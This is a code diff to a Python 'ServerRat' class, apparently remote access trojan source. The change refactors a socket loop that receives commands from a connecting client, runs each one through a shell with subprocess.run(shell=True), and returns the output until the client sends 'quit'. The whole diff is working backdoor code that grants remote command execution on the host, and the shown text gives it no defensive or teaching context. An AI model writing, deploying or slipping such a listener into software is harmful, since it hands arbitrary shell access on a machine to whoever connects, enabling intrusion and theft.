@@ -1,8 +1,6 @@
-import os
 import socket
 import argparse
 import subprocess
-from io import BufferedReader
 
 
 class ServerRat:
@@ -21,18 +19,24 @@ class ServerRat:
             with connection:
                 print("Connection received from: ", address)
                 while True:
-                    # TODO - Need to figure out how to receive the command and then execute it
-                    #   Also need to figure out how to receive the quit command and exit properly
-                    data = connection.recv(1024)
+                    data = self.recv_command(connection)
 
                     if data.decode() == "quit":
                         print("Client has ended the session.")
                         break
 
-                    command = data.decode()
-                    command_output = subprocess.run(command, shell=True, capture_output=True)
+                    command_output = self.execute_command(data)
+                    self.send_command_output(connection, command_output)
 
+    def recv_command(self, connection):
+        return connection.recv(1024)
 
+    def execute_command(self,data):
+        command = data.decode()
+        return subprocess.run(command, shell=True, capture_output=True)
+
+    def send_command_output(self, connection, command_output):
+        connection.send(command_output.stdout)
 
 
 def main(args):
